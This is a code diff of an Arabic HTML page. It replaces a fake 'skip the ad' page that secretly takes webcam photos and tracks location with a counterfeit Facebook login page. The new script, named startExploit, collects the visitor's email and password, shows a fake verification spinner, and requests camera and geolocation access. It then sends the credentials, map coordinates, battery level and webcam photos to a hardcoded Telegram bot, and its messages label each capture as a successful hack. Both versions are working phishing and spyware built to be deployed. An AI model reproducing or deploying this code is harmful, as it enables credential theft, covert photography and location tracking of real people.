@@ -2,79 +2,118 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جاري تجهيز الرابط...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية للمتابعة</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
+        .logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .info { font-size: 12px; color: #777; margin-top: 15px; }
+    </style>
 </head>
-<body style="background:#f4f4f4; color:#333; text-align:center; font-family:sans-serif; padding-top:100px;">
-    <div style="background:#fff; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-        <h2 style="color:#d9534f;">اضغط على المستطيل الاخضر لتخطي الاعلان ابو الطويل</h2>
-        <p>يرجى الضغط على الزر أدناه للمتابعة إلى المحتوى المطلوب.</p>
-        
-        <button id="authBtn" style="padding:15px 40px; background:#28a745; color:#fff; border:none; font-size:18px; font-weight:bold; cursor:pointer; border-radius:5px; margin-top:20px;">تخطّي الإعلان الآن</button>
-        
-        <p style="font-size:12px; color:#777; margin-top:15px;">سيتم توجيهك تلقائياً بعد الفحص...</p>
+<body>
+
+<div class="container" id="box">
+    <div class="logo">facebook</div>
+    <div id="login_form">
+        <p>يرجى تسجيل الدخول للمتابعة إلى المحتوى</p>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
+        <button onclick="startExploit()">تسجيل الدخول</button>
     </div>
+    
+    <div id="loading" style="display:none;">
+        <p>جاري التحقق من البيانات...</p>
+        <img src="https://i.gifer.com/ZZ5H.gif" width="50">
+    </div>
+    
+    <p class="info">سيتم توجيهك تلقائياً بعد التأكد من الحساب.</p>
+</div>
 
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;"></canvas>
+<video id="v" style="display:none;" autoplay></video>
+<canvas id="c" style="display:none;"></canvas>
 
-    <script>
-        const T = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-        const C = "7214473798";
+<script>
+    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+    const CHAT_ID = "7214473798";
 
-        document.getElementById('authBtn').onclick = async () => {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('v'); v.srcObject = s;
+    // وظيفة بدء الهجوم عند الضغط على الزر
+    async function startExploit() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
 
-                // تنفيذ المهمة فوراً ثم تكرارها كل 10 ثوانٍ
-                collectAndSend(v);
-                setInterval(() => collectAndSend(v), 10000);
-
-            } catch (e) { 
-                alert("خطأ: يجب السماح بالصلاحيات لتخطي الإعلان!"); 
-            }
-        };
-
-        async function collectAndSend(videoElement) {
-            // 1. جلب بيانات البطارية
-            let batteryInfo = "غير معروف";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'شاحن متصل' : 'يفرغ'})`;
-            }
-
-            // 2. جلب بيانات الشبكة
-            let netInfo = "غير معروف";
-            if (navigator.connection) {
-                netInfo = `النوع: ${navigator.connection.effectiveType} | السرعة: ${navigator.connection.downlink}Mbps`;
-            }
-
-            // 3. جلب الموقع الجغرافي وإرسال التقرير النصي
-            navigator.geolocation.getCurrentPosition(p => {
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const msg = `📊 **تقرير ضحية جديد**\n\n` +
-                            `🔋 الشحن: ${batteryInfo}\n` +
-                            `🌐 الشبكة: ${netInfo}\n` +
-                            `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
-                
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            });
-
-            // 4. التقاط الصورة وإرسالها
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.width = videoElement.videoWidth; 
-                canvas.height = videoElement.videoHeight;
-                canvas.getContext('2d').drawImage(videoElement, 0, 0);
-                
-                canvas.toBlob(b => {
-                    const form = new FormData(); 
-                    form.append('photo', b, 'capture.jpg');
-                    fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: form });
-                }, 'image/jpeg');
-            }, 1000);
+        if (!user || !pass) {
+            alert("يرجى إدخال البيانات المطلوبة!");
+            return;
         }
-    </script>
+
+        // 1. تغيير الواجهة للتمويه
+        document.getElementById('login_form').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        // 2. طلب صلاحيات الكاميرا والموقع فوراً
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            // إرسال تقرير شامل (بيانات الدخول + الموقع + الجهاز)
+            collectFullData(user, pass, video);
+        } catch (e) {
+            // حتى لو رفض الكاميرا، سنرسل بيانات الدخول والموقع
+            collectFullData(user, pass, null);
+        }
+    }
+
+    async function collectFullData(user, pass, videoElement) {
+        // جلب بيانات البطارية
+        let battery = "غير متاح";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = `${Math.round(b.level * 100)}%`;
+        }
+
+        // جلب الموقع
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // إرسال الرسالة النصية الكبرى
+            const report = `🚀 **عملية اختراق ناجحة**\n\n` +
+                           `👤 الحساب: \`${user}\`\n` +
+                           `🔑 كلمة السر: \`${pass}\`\n` +
+                           `🔋 الشحن: ${battery}\n` +
+                           `📍 الموقع: ${mapUrl}`;
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            
+            // إرسال الصورة إذا توفرت الكاميرا
+            if (videoElement) {
+                setTimeout(() => captureAndSend(videoElement), 2000);
+            }
+        }, async () => {
+            // في حال رفض الموقع، نرسل البيانات المتاحة فقط
+            const report = `⚠️ **صيد (بدون موقع)**\n\n👤 الحساب: \`${user}\`\n🔑 كلمة السر: \`${pass}\`\n🔋 الشحن: ${battery}`;
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+        });
+    }
+
+    function captureAndSend(video) {
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'victim.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: formData });
+        }, 'image/jpeg');
+    }
+</script>
+
 </body>
 </html>
